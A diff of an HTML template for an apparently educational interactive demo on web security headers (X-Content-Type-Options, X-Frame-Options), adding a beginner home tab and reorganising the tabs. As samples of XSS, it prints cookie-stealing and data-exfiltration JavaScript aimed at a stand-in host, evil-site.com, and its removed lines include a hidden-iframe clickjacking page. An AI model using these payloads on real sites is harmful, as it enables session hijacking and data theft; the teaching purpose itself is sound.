@@ -7,433 +7,1711 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <div class="container">
+    <div class="container-header">
         <h1>🛡️ Security Headers Interactive Demo</h1>
         
         <div class="tabs">
-            <button class="tab-button active" onclick="showTab('xcto')">X-Content-Type-Options</button>
+            <button class="tab-button active" onclick="showTab('home')">🏠 Home</button>
+            <button class="tab-button" onclick="showTab('xcto')">X-Content-Type-Options</button>
             <button class="tab-button" onclick="showTab('xfo')">X-Frame-Options</button>
             <button class="tab-button" onclick="showTab('csp')">Content-Security-Policy</button>
+            <button class="tab-button" onclick="showTab('hsts')">Strict-Transport-Security</button>
+            <button class="tab-button" onclick="showTab('refpol')">Referrer-Policy</button>
+            <button class="tab-button" onclick="showTab('permpol')">Permissions Policy</button>
+            <button class="tab-button" onclick="showTab('quiz')">🎓 Quiz</button>
         </div>
+    </div>
 
-<!-- X-CONTENT-TYPE-OPTIONS TAB CONTENT-->
-        <div id="xcto" class="tab-content active">
-            <!-- Header Explanation -->
-            <div class="section">
-                <div class="section-header">
-                    <span class="section-icon">📋</span>
-                    <h2 class="section-title">Understanding X-Content-Type-Options</h2>
-                </div>
-                
-                <div class="intro-grid">
-                    <div class="info-card">
-                        <h4>🎯 What It Does</h4>
-                        <p>Prevents browsers from MIME-sniffing a response away from the declared Content-Type. When set to "nosniff", browsers must respect the server's Content-Type header exactly.
-                        <br>What's MIME-sniffing?
-                        <br>Originally it was meant to be helpful by fixing broken servers that didn't set headers correctly. The browser would do this by checking the content, and guessing the correct way to render it in the hopes that this would improve the user experience.
-                        <br>Unfortunately in security contexts, this behavior can be seriously dangerous if not properly controlled.
-                        </p>                        
-                    </div>
-                    <div class="info-card">
-                        <h4>⚠️ The Risk</h4>
-                        <p>Without this header, browsers may execute files as JavaScript even when served with innocent MIME types like text/plain or image/jpeg, leading to XSS attacks.
-                        <br>For example: A browser might treat a file such as "example.txt" as JavaScript because it contains JavaScript code in it.
-                        </p>
-                    </div>
-                </div>
+    <div class="container">
 
-                <div class="code-block" data-label="HTTP Response Header">
-                X-Content-Type-Options: nosniff</div>
+<!-- HOME TAB CONTENT -->
+    <div id="home" class="tab-content active">
+        <!-- Introduction Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">👋</span>
+                <h2 class="section-title">Welcome to Security Headers Interactive Learning</h2>
             </div>
+            
+            <p style="font-size: 1.2rem; color: #555; margin-bottom: 30px; text-align: center;">
+                Learn how invisible guardians protect millions of websites every day - and the dangers if they don't!
+            </p>
 
-            <!-- Real-World Scenario -->
-            <div class="section">
-                <div class="section-header">
-                    <span class="section-icon">🏢</span>
-                    <h2 class="section-title">Real-World Scenario: Corporate Document Portal</h2>
-                </div>
-                
-                <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
-                    Imagine you work for <strong>SecureCorp</strong>, which has an internal document sharing portal where employees upload reports, presentations, and other business files. The system is designed to accept various file types for legitimate business purposes.
-                </p>
-
+            <div class="intro-grid">
                 <div class="info-card">
-                    <h4>🎯 Legitimate Use Case</h4>
-                    <p>Employees upload quarterly reports (quarterly-report.txt), meeting notes, configuration files, and data exports. These text files contain sensitive business information and are meant to be viewed as plain text documents.</p>
+                    <h4>🤔 What Are Security Headers?</h4>
+                    <p>Think of security headers like invisible security guards for websites. Just like how a bouncer at a club checks IDs and enforces rules, security headers tell your web browser: "Here are the safety rules for this website - please follow them to keep the user safe."</p>
                 </div>
-            </div>
-
-            <!-- Attack Scenario -->
-            <div class="section interactive-section">
-                <div class="section-header">
-                    <span class="section-icon">🎭</span>
-                    <h2 class="section-title">Interactive Demo: The Attack</h2>
-                </div>
-
-                <div class="interactive-badge">
-                    <span class="interactive-icon">🎮</span>
-                    <span>Try the interactive simulation below</span>
-                </div>
-
-                <p style="margin-bottom: 20px; color: #666;">
-                    An attacker (perhaps a disgruntled employee or someone who gained access) uploads what appears to be a harmless text file called "team-updates.txt" but contains malicious JavaScript code instead of actual team updates.
-                </p>
-                <p style="margin-bottom: 20px; color: #666;">
-                    What employees expect to see:
-                    <div class="code-block" data-label="File Contents">Team Updates for Q4...
-                </div></p>
-                <p style="margin-bottom: 20px; color: #666;">
-                    What's actually in the file:
-                    <div class="code-block" data-label="Malicious File Contents">document.location='http://evil-site.com/steal?data='+document.cookie;
-                </div></p>
-                <p style="margin-bottom: 20px; color: #666;">
-                    Which attempts to send a victim user's cookie to a website owned by the attacker, which they would then use to steal the victim's active session on the vulnerable website.
-                    <br>OR
-                    <div class="code-block" data-label="Malicious File Contents">fetch('/api/users').then(r=>r.json()).then(users=>
-                    <br>  fetch('http://evil-site.com/exfil', {
-                    <br>    method: 'POST', 
-                    <br>    body: JSON.stringify(users)
-                    <br>  }));
-                </div></p>
-                <p style="margin-bottom: 20px; color: #666;">
-                    Which attempts to steal sensitive data, and send it back to the attacker controlled website. This could include anything from a list of users to login tokens.
-                </p>
-                <p style="margin-bottom: 20px; color: #666;">
-                    Our demo below will not do anything so malicious. Instead for demonstration purposes, it will simply pop an alert as a proof of concept.
-                </p>
-
-
-                <div class="demo-container">
-                    <h3 style="margin-bottom: 20px; color: #333;">📁 File Upload Simulation</h3>
-                    
-                    <div class="upload-simulator" id="uploadArea">
-                        <div class="file-icon">📄</div>
-                        <h4>team-updates.txt</h4>
-                        <p style="color: #666; margin-top: 10px;">Click "Upload Malicious File" to simulate an attacker uploading this file</p>
-                        
-                        <div class="code-block" data-label="Malicious File Contents" style="margin-top: 20px; text-align: left;">
-                            alert('🚨 SIMULATED ATTACK: Your session would be stolen!\n\nIn reality, this would happen silently in the background.');
-                        </div>
-                    </div>
-
-                    <div class="controls">
-                        <button class="btn btn-danger" id="uploadBtn" onclick="simulateUpload()">
-                            Upload Malicious File
-                        </button>
-                        <button class="btn btn-danger" id="disableBtn" onclick="toggleHeader(false)" disabled>
-                            ⚠️ Disable Protection
-                        </button>
-                        <button class="btn btn-primary" id="enableBtn" onclick="toggleHeader(true)">
-                            🛡️ Enable Protection
-                        </button>
-                    </div>
-
-                    <div class="status-indicator" id="headerStatus">
-                        <span id="statusIcon">🚨</span>
-                        <span id="statusText">X-Content-Type-Options: DISABLED (Vulnerable)</span>
-                    </div>
-
-                    <div class="result-box result-info" id="resultBox">
-                        Click "Upload Malicious File" to see what happens when someone visits this file...
-                    </div>
-
-                    <div class="technical-details" id="technicalDetails" style="display: none;">
-                        <p class="technical-explanation" id="technicalExplanation">
-                            <!-- Technical details will be populated by JavaScript -->
-                        </p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Impact Analysis -->
-            <div class="section">
-                <div class="section-header">
-                    <span class="section-icon">💥</span>
-                    <h2 class="section-title">Real-World Impact</h2>
-                </div>
-
-                <p style="margin-bottom: 20px; color: #666;">
-                    This isn't just about popup alerts. In a real attack, the consequences for SecureCorp could be devastating:
-                </p>
-
-                <div class="impact-grid">
-                    <div class="impact-card">
-                        <h5>🔓 Session Hijacking</h5>
-                        <p>Steal employee login sessions to access sensitive systems and data without credentials.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>📊 Data Exfiltration</h5>
-                        <p>Extract customer data, financial records, or trade secrets, and send them to attacker-controlled servers.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>🎭 Privilege Escalation</h5>
-                        <p>If an admin clicks the malicious file, attacker gains admin access to modify users, permissions, and critical settings.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>💰 Financial Impact</h5>
-                        <p>Million dollar fines, regulatory penalties, customer lawsuits, business disruption, and reputation damage.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>🕵️ Persistence</h5>
-                        <p>Install backdoors, create new admin accounts, and maintain long-term access to the corporate network.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>🏭 Supply Chain Attack</h5>
-                        <p>Use compromised corporate systems to attack business partners and customers, spreading the breach.</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Mitigation -->
-            <div class="section">
-                <div class="mitigation-section">
-                    <h4><span>🛡️</span> How to Protect Your Application</h4>
-                    
-                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
-                        <div>
-                            <h5 style="color: #27ae60; margin-bottom: 10px;">Server Configuration</h5>
-                            <div class="code-block" data-label="Apache (.htaccess)">
-                            Header always set X-Content-Type-Options nosniff</div>
-                            
-                            <div class="code-block" data-label="Nginx">
-                            add_header X-Content-Type-Options nosniff;</div>
-                        </div>
-                        
-                        <div>
-                            <h5 style="color: #27ae60; margin-bottom: 10px;">Application Code</h5>
-                            <div class="code-block" data-label="Express.js">
-                            app.use((req, res, next) => {
-                            res.header('X-Content-Type-Options', 'nosniff');
-                            next();
-                            });</div>
-                            
-                            <div class="code-block" data-label="Flask/Django">
-                            response.headers['X-Content-Type-Options'] = 'nosniff'</div>
-                        </div>
-                    </div>
-
-                    <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
-                        <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
-                        <ul style="color: #666; line-height: 2;">
-                            <li>✅ Set X-Content-Type-Options: nosniff on all responses</li>
-                            <li>✅ Validate file types on upload (don't trust extensions)</li>
-                            <li>✅ Use a Web Application Firewall</li>
-                            <li>✅ Use Content Security Policy as additional defense</li>
-                            <li>✅ Regularly scan for security headers with tools like securityheaders.com</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-<!-- X-FRAME-OPTIONS TAB CONTENT-->
-        <div id="xfo" class="tab-content">
-            <!-- Header Explanation -->
-            <div class="section">
-                <div class="section-header">
-                    <span class="section-icon">🖼️</span>
-                    <h2 class="section-title">Understanding X-Frame-Options</h2>
-                </div>
-                
-                <div class="intro-grid">
-                    <div class="info-card">
-                        <h4>🎯 What It Does</h4>
-                        <p>Prevents your website from being embedded in frames or iframes on other domains. Controls whether browsers should allow your site to be displayed within frames, preventing clickjacking attacks.
-                        <br>What's an iframe? It's like a window within a window, where the content inside can come from the same site or a completely different one.
-                        <br>What's clickjacking? It's when an attacker tricks you into clicking something on a website that looks harmless, but secretly performs a dangerous action.
-                        </p>
-                    </div>
-                    <div class="info-card">
-                        <h4>⚠️ The Risk</h4>
-                        <p>Without this header, attackers can embed your site invisibly in their malicious pages, tricking users into clicking on your site while thinking they're interacting with the attacker's content.
-                        <br>Additionally, an attacker could do the opposite. They could copy your site within an iframe without doing any actual work to recreate the website from scratch. Then, create invisible inputs to trick user into submitting their credentials on what they think is the legitimate site when it's actually the attacker's site.
-                        </p>
-                    </div>
-                </div>
-
-                <div class="code-block" data-label="HTTP Response Header">
-                X-Frame-Options: DENY
-                X-Frame-Options: SAMEORIGIN
-                X-Frame-Options: ALLOW-FROM https://trusted-site.com</div>
-            </div>
-
-            <!-- Real-World Scenario -->
-            <div class="section">
-                <div class="section-header">
-                    <span class="section-icon">🏦</span>
-                    <h2 class="section-title">Real-World Scenario: Online Banking Portal</h2>
-                </div>
-                
-                <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
-                    Imagine <strong>SecureBank</strong> has an online banking portal where customers log in to check balances, transfer money, and manage accounts. The bank's website handles sensitive financial transactions and personal data.
-                </p>
-
                 <div class="info-card">
-                    <h4>🎯 Legitimate Use Case</h4>
-                    <p>Customers visit securebank.com directly to access their accounts, make transfers, and view statements. The banking interface should only appear on the bank's own domain to ensure security and user trust.</p>
-                </div>
-            </div>
-
-            <!-- Attack Scenario -->
-            <div class="section interactive-section">
-                <div class="section-header">
-                    <span class="section-icon">🎭</span>
-                    <h2 class="section-title">Interactive Demo: Clickjacking Attack</h2>
-                </div>
-
-                <div class="interactive-badge">
-                    <span class="interactive-icon">🎮</span>
-                    <span>Try the interactive clickjacking simulation below</span>
-                </div>
-
-                <p style="margin-bottom: 20px; color: #666;">
-                    An attacker creates a fake website (evil-deals.com) that appears to offer amazing deals, but secretly embeds the bank's login page invisibly. Users think they're clicking "Claim Your Prize" but are actually clicking the bank's "Transfer Money" button.
-                </p>
-
-                <div class="demo-container">
-                    <h3 style="margin-bottom: 20px; color: #333;">🕸️ Clickjacking Attack Simulation</h3>
-                    
-                    <div class="upload-simulator" id="clickjackArea">
-                        <div class="file-icon">🎁</div>
-                        <h4>AMAZING PRIZE GIVEAWAY!</h4>
-                        <p style="color: #666; margin-top: 10px;">Click the button below to see how clickjacking works</p>
-                        
-                        <div class="code-block" data-label="Malicious Website Code" style="margin-top: 20px; text-align: left;">
-                        &lt;!-- Attacker's page: evil-deals.com --&gt;
-                        &lt;div style="position: relative;"&gt;
-                        &lt;button&gt;🎁 CLAIM YOUR $1000 PRIZE! 🎁&lt;/button&gt;
-                        
-                        &lt;!-- Hidden bank iframe positioned over the button --&gt;
-                        &lt;iframe src="https://securebank.com/transfer"
-                                style="position: absolute; opacity: 0; 
-                                        top: 0; left: 0; width: 100%; height: 100%"&gt;
-                        &lt;/iframe&gt;
-                        &lt;/div&gt;
-                        </div>
-                    </div>
-
-                    <div class="controls">
-                        <button class="btn btn-danger" id="clickjackBtn" onclick="simulateClickjack()">
-                            🎁 Claim Your Prize! (Clickjacking Demo)
-                        </button>
-                        <button class="btn btn-danger" id="disableFrameBtn" onclick="toggleFrameProtection(false)" disabled>
-                            ⚠️ Disable Frame Protection
-                        </button>
-                        <button class="btn btn-primary" id="enableFrameBtn" onclick="toggleFrameProtection(true)">
-                            🛡️ Enable Frame Protection
-                        </button>
-                    </div>
-
-                    <div class="status-indicator" id="frameStatus">
-                        <span id="frameStatusIcon">🚨</span>
-                        <span id="frameStatusText">X-Frame-Options: DISABLED (Vulnerable)</span>
-                    </div>
-
-                    <div class="result-box result-info" id="frameResultBox">
-                        Click "Claim Your Prize!" to see how clickjacking tricks users into unintended actions...
-                    </div>
-
-                    <div class="technical-details" id="frameTechnicalDetails" style="display: none;">
-                        <p class="technical-explanation" id="frameTechnicalExplanation">
-                            <!-- Technical details will be populated by JavaScript -->
-                        </p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Impact Analysis -->
-            <div class="section">
-                <div class="section-header">
-                    <span class="section-icon">💥</span>
-                    <h2 class="section-title">Real-World Impact</h2>
-                </div>
-
-                <p style="margin-bottom: 20px; color: #666;">
-                    Clickjacking attacks on financial institutions have caused massive damage. Here's what SecureBank could face:
-                </p>
-
-                <div class="impact-grid">
-                    <div class="impact-card">
-                        <h5>💸 Unauthorized Transfers</h5>
-                        <p>Customers unknowingly authorize money transfers to attacker accounts, leading to direct financial theft and bank liability.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>🔐 Account Compromises</h5>
-                        <p>Trick users into changing passwords, email addresses, or security settings, giving attackers full account control.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>📋 Information Disclosure</h5>
-                        <p>Force users to share account details, balances, transaction history, and personal information with malicious sites.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>⚖️ Regulatory Violations</h5>
-                        <p>Banking regulators impose severe penalties for insufficient security controls - fines can reach millions of dollars.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>🏛️ Trust Destruction</h5>
-                        <p>Customers lose faith in the bank's security, leading to account closures, negative publicity, and long-term reputation damage.</p>
-                    </div>
-                    <div class="impact-card">
-                        <h5>📊 Mass Exploitation</h5>
-                        <p>Attackers can scale clickjacking attacks to thousands of users simultaneously through social media and ad networks.</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Mitigation -->
-            <div class="section">
-                <div class="mitigation-section">
-                    <h4><span>🛡️</span> How to Protect Your Application</h4>
-                    
-                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
-                        <div>
-                            <h5 style="color: #27ae60; margin-bottom: 10px;">Server Configuration</h5>
-                            <div class="code-block" data-label="Apache (.htaccess)">
-                            Header always set X-Frame-Options DENY</div>
-                            
-                            <div class="code-block" data-label="Nginx">
-                            add_header X-Frame-Options SAMEORIGIN;</div>
-                        </div>
-                        
-                        <div>
-                            <h5 style="color: #27ae60; margin-bottom: 10px;">Application Code</h5>
-                            <div class="code-block" data-label="Express.js">
-                            app.use((req, res, next) => {
-                            res.header('X-Frame-Options', 'DENY');
-                            next();
-                            });</div>
-                            
-                            <div class="code-block" data-label="Flask/Django">
-                            response.headers['X-Frame-Options'] = 'SAMEORIGIN'</div>
-                        </div>
-                    </div>
-
-                    <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
-                        <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
-                        <ul style="color: #666; line-height: 2;">
-                            <li>✅ Set X-Frame-Options: DENY for maximum protection</li>
-                            <li>✅ Use SAMEORIGIN only if you need to frame your own content</li>
-                            <li>✅ Consider upgrading to Content-Security-Policy: frame-ancestors</li>
-                            <li>✅ Test framing protection with browser dev tools</li>
-                            <li>✅ Monitor for attempts to bypass frame protection</li>
-                        </ul>
-                    </div>
+                    <h4>📬 Where Do They Live?</h4>
+                    <p>Security headers travel with every webpage, like a letter's return address. When you visit any website, the server sends hidden instructions along with the page content. Your browser reads these instructions and follows the security rules automatically.</p>
                 </div>
             </div>
         </div>
 
-<!-- CONTENT-SECURITY-POLICY TAB CONTENT-->
-        <div id="csp" class="tab-content">
-            <div class="section">
-                <div class="section-header">
-                    <span class="section-icon">🔒</span>
-                    <h2 class="section-title">Content-Security-Policy</h2>
+        <!-- How It Works Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🔍</span>
+                <h2 class="section-title">How Does This Actually Work?</h2>
+            </div>
+
+            <p style="margin-bottom: 25px; color: #666; font-size: 1.1rem;">
+                Every time you visit a website, there's an invisible conversation happening between your browser and the website's server:
+            </p>
+
+            <div style="background: #f8f9fa; padding: 25px; border-radius: 10px; margin: 20px 0;">
+                <div style="display: grid; grid-template-columns: 1fr auto 1fr; gap: 20px; align-items: center;">
+                    <div style="text-align: center;">
+                        <div style="font-size: 3rem; margin-bottom: 10px;">💻</div>
+                        <h4>Your Browser</h4>
+                        <p style="color: #666; font-size: 0.9rem;">"Hey, can I see your homepage?"</p>
+                    </div>
+                    <div style="font-size: 2rem; color: #667eea;">↔️</div>
+                    <div style="text-align: center;">
+                        <div style="font-size: 3rem; margin-bottom: 10px;">🖥️</div>
+                        <h4>Website Server</h4>
+                        <p style="color: #666; font-size: 0.9rem;">"Sure! Here's the page AND here are the security rules to follow."</p>
+                    </div>
                 </div>
-                <p style="color: #666; font-size: 1.1rem;">Coming soon... This will demonstrate XSS prevention through CSP implementation.</p>
+            </div>
+            <p style="color: #666; margin-top: 20px;">
+                Below is an example of what your browser will receive in return.
+            </p>
+            <div class="code-block" data-label="What Your Browser Actually Receives (Hidden from You)">
+    <pre>HTTP/1.1 200 OK
+    Content-Type: text/html
+    X-Content-Type-Options: nosniff
+    X-Frame-Options: DENY
+    Content-Security-Policy: default-src 'self'
+
+    &lt;html&gt;&lt;body&gt;Welcome to our website!&lt;/body&gt;&lt;/html&gt;</pre></div>
+
+            <p style="color: #666; margin-top: 20px;">
+                You only see the webpage content, but your browser quietly reads and enforces those security rules in the background - keeping you safe without you even knowing it!
+            </p>
+        </div>
+
+        <!-- Real World Examples Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🌍</span>
+                <h2 class="section-title">Who Uses Security Headers?</h2>
+            </div>
+
+            <p style="margin-bottom: 25px; color: #666; font-size: 1.1rem;">
+                Security headers protect websites you use every single day:
+            </p>
+
+            <div class="impact-grid">
+                <div class="impact-card" style="border-left-color: #667eea;">
+                    <h5>🏦 Banks & Finance</h5>
+                    <p>Your online banking, payment apps, and investment platforms use security headers to protect your money and financial data from theft.</p>
+                </div>
+                <div class="impact-card" style="border-left-color: #667eea;">
+                    <h5>🛒 Online Shopping</h5>
+                    <p>E-commerce sites like Amazon, eBay, and your favorite stores use headers to secure your credit card info and purchase history.</p>
+                </div>
+                <div class="impact-card" style="border-left-color: #667eea;">
+                    <h5>📱 Social Media</h5>
+                    <p>Facebook, Twitter, Instagram, and TikTok use security headers to prevent hackers from stealing your photos and personal messages.</p>
+                </div>
+                <div class="impact-card" style="border-left-color: #667eea;">
+                    <h5>🏥 Healthcare</h5>
+                    <p>Medical portals and telehealth apps protect your sensitive health records and prescription information with security headers.</p>
+                </div>
+                <div class="impact-card" style="border-left-color: #667eea;">
+                    <h5>🎓 Education</h5>
+                    <p>School systems, online learning platforms, and student portals safeguard grades and educational records.</p>
+                </div>
+                <div class="impact-card" style="border-left-color: #667eea;">
+                    <h5>💼 Your Workplace</h5>
+                    <p>Company websites, HR systems, and internal tools use headers to protect business data and employee information.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Configuration Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">⚙️</span>
+                <h2 class="section-title">Who Sets Up These Security Rules?</h2>
+            </div>
+
+            <p style="margin-bottom: 25px; color: #666; font-size: 1.1rem;">
+                Security headers are configured by the technical teams that build and maintain websites:
+            </p>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px;">
+                <div style="background: white; padding: 20px; border-radius: 10px; border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60; margin-bottom: 15px;">👩‍💻 Web Developers</h4>
+                    <p style="color: #666; font-size: 0.95rem;">The programmers who build websites add security headers to their code, like adding safety features to a car during manufacturing.</p>
+                </div>
+                
+                <div style="background: white; padding: 20px; border-radius: 10px; border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db; margin-bottom: 15px;">🔧 System Administrators</h4>
+                    <p style="color: #666; font-size: 0.95rem;">The people who manage web servers can configure headers at the server level, like setting building-wide security policies.</p>
+                </div>
+                
+                <div style="background: white; padding: 20px; border-radius: 10px; border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c; margin-bottom: 15px;">🛡️ Security Teams</h4>
+                    <p style="color: #666; font-size: 0.95rem;">Cybersecurity experts determine which headers are needed and monitor them, like security consultants designing a protection plan.</p>
+                </div>
+            </div>
+
+            <div style="background: #e8f4fd; padding: 20px; border-radius: 10px; margin-top: 25px;">
+                <h4 style="color: #333; margin-bottom: 15px;">💡 Why This Matters to You</h4>
+                <p style="color: #666; line-height: 1.6;">
+                    Whether you're learning web development, working in IT, studying cybersecurity, or just curious about how the internet stays safe - understanding security headers helps you make better decisions about online safety and gives you insight into the invisible infrastructure protecting digital life.
+                </p>
+            </div>
+        </div>
+        <!-- Learning Path Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🎯</span>
+                <h2 class="section-title">Ready to Learn? Here's Your Path Forward</h2>
+            </div>
+
+            <p style="margin-bottom: 25px; color: #666; font-size: 1.1rem;">
+                We'll explore these essential security headers through hands-on simulations. Each tab shows you exactly how attacks work, and how headers stop them.
+                <br> If you're ready, we can start with learning about the X-Content-Type-Options header:
+            </p>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
+                <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); padding: 20px; border-radius: 10px; border: 2px solid #667eea;">
+                    <h4 style="color: #667eea; margin-bottom: 10px;">📋 X-Content-Type-Options</h4>
+                    <p style="color: #666; font-size: 0.9rem; margin-bottom: 15px;">See how malicious files can disguise themselves and learn how this header stops them cold.</p>
+                    <button class="btn btn-primary" onclick="showTab('xcto')" style="font-size: 0.9rem;">Start Here →</button>
+                </div>
             </div>
         </div>
     </div>
 
+<!-- X-CONTENT-TYPE-OPTIONS TAB CONTENT-->
+    <div id="xcto" class="tab-content">
+        <!-- Header Explanation -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">📋</span>
+                <h2 class="section-title">Understanding X-Content-Type-Options</h2>
+            </div>
+            
+            <div class="intro-grid">
+                <div class="info-card">
+                    <h4>🎯 What It Does</h4>
+                    <p>Prevents browsers from MIME-sniffing a response away from the declared Content-Type. When set to "nosniff", browsers must respect the server's Content-Type header exactly.
+                    <br>What's MIME-sniffing?
+                    <br>Originally it was meant to be helpful by fixing broken servers that didn't set headers correctly. The browser would do this by checking the content, and guessing the correct way to render it in the hopes that this would improve the user experience.
+                    <br>Unfortunately in security contexts, this behavior can be seriously dangerous if not properly controlled.
+                    </p>                        
+                </div>
+                <div class="info-card">
+                    <h4>⚠️ The Risk</h4>
+                    <p>Without this header, browsers may execute files as JavaScript even when served with innocent MIME types like text/plain or image/jpeg, leading to XSS attacks.
+                    <br>For example: A browser might treat a file such as "example.txt" as JavaScript because it contains JavaScript code in it.
+                    </p>
+                </div>
+            </div>
+
+            <div class="code-block" data-label="HTTP Response Header">
+            X-Content-Type-Options: nosniff</div>
+        </div>
+
+        <!-- Real-World Scenario -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🏢</span>
+                <h2 class="section-title">Real-World Scenario: Corporate Document Portal</h2>
+            </div>
+            
+            <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                Imagine you work for <strong>SecureCorp</strong>, which has an internal document sharing portal where employees upload reports, presentations, and other business files. The system is designed to accept various file types for legitimate business purposes.
+            </p>
+
+            <div class="info-card">
+                <h4>🎯 Legitimate Use Case</h4>
+                <p>Employees upload quarterly reports (quarterly-report.txt), meeting notes, configuration files, and data exports. These text files contain sensitive business information and are meant to be viewed as plain text documents.</p>
+            </div>
+        </div>
+
+        <!-- Attack Scenario -->
+        <div class="section interactive-section">
+            <div class="section-header">
+                <span class="section-icon">🎭</span>
+                <h2 class="section-title">Interactive Demo: The Attack</h2>
+            </div>
+
+            <div class="interactive-badge">
+                <span class="interactive-icon">🎮</span>
+                <span>Try the interactive simulation below</span>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                An attacker (perhaps a disgruntled employee or someone who gained access) uploads what appears to be a harmless text file called "team-updates.txt" but contains malicious JavaScript code instead of actual team updates.
+            </p>
+            <p style="margin-bottom: 20px; color: #666;">
+                What employees expect to see:
+                <div class="code-block" data-label="File Contents">Team Updates for Q4...
+            </div></p>
+            <p style="margin-bottom: 20px; color: #666;">
+                What's actually in the file:
+                <div class="code-block" data-label="Malicious File Contents">document.location='http://evil-site.com/steal?data='+document.cookie;
+            </div></p>
+            <p style="margin-bottom: 20px; color: #666;">
+                Which attempts to send a victim user's cookie to a website owned by the attacker, which they would then use to steal the victim's active session on the vulnerable website.
+                <br>OR
+                <div class="code-block" data-label="Malicious File Contents">fetch('/api/users').then(r=>r.json()).then(users=>fetch('http://evil-site.com/exfil', {
+                <pre>    method: 'POST',</pre>
+                <pre>    body: JSON.stringify(users)</pre>
+                }));
+            </div></p>
+            <p style="margin-bottom: 20px; color: #666;">
+                Which attempts to steal sensitive data, and send it back to the attacker controlled website. This could include anything from a list of users to login tokens.
+            </p>
+            <p style="margin-bottom: 20px; color: #666;">
+                Our demo below will not do anything so malicious. Instead for demonstration purposes, it will simply pop an alert as a proof of concept.
+            </p>
+
+
+            <div class="demo-container">
+                <h3 style="margin-bottom: 20px; color: #333;">📁 File Upload Simulation</h3>
+                
+                <div class="upload-simulator" id="uploadArea">
+                    <div class="file-icon">📄</div>
+                    <h4>team-updates.txt</h4>
+                    <p style="color: #666; margin-top: 10px;">Click "Upload Malicious File" to simulate an attacker uploading this file</p>
+                    
+                    <div class="code-block" data-label="Malicious File Contents" style="margin-top: 20px; text-align: left;">
+                        alert('🚨 SIMULATED ATTACK: Your session would be stolen!\n\nIn reality, this would happen silently in the background.');
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-danger" id="uploadFileBtn" onclick="simulateUpload()">
+                        Upload Malicious File
+                    </button>
+                    <button class="btn btn-danger" id="disableContentBtn" onclick="toggleHeader(false)" disabled>
+                        ⚠️ Disable Protection
+                    </button>
+                    <button class="btn btn-primary" id="enableContentBtn" onclick="toggleHeader(true)">
+                        🛡️ Enable Protection
+                    </button>
+                </div>
+
+                <div class="status-indicator" id="headerStatus">
+                    <span id="statusIcon">🚨</span>
+                    <span id="statusText">X-Content-Type-Options: DISABLED (Vulnerable)</span>
+                </div>
+
+                <div class="result-box result-info" id="resultBox">
+                    Click "Upload Malicious File" to see what happens when someone visits this file...
+                </div>
+
+                <div class="technical-details" id="technicalDetails" style="display: none;">
+                    <p class="technical-explanation" id="technicalExplanation">
+                        <!-- Technical details will be populated by JavaScript -->
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Impact Analysis -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">💥</span>
+                <h2 class="section-title">Real-World Impact</h2>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                This isn't just about popup alerts. In a real attack, the consequences for SecureCorp could be devastating:
+            </p>
+
+            <div class="impact-grid">
+                <div class="impact-card">
+                    <h5>🔒 Session Hijacking</h5>
+                    <p>Steal employee login sessions to access sensitive systems and data without credentials.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📊 Data Exfiltration</h5>
+                    <p>Extract customer data, financial records, or trade secrets, and send them to attacker-controlled servers.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🎭 Privilege Escalation</h5>
+                    <p>If an admin clicks the malicious file, attacker gains admin access to modify users, permissions, and critical settings.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>💰 Financial Impact</h5>
+                    <p>Million dollar fines, regulatory penalties, customer lawsuits, business disruption, and reputation damage.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🕵️ Persistence</h5>
+                    <p>Install backdoors, create new admin accounts, and maintain long-term access to the corporate network.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🏭 Supply Chain Attack</h5>
+                    <p>Use compromised corporate systems to attack business partners and customers, spreading the breach.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mitigation -->
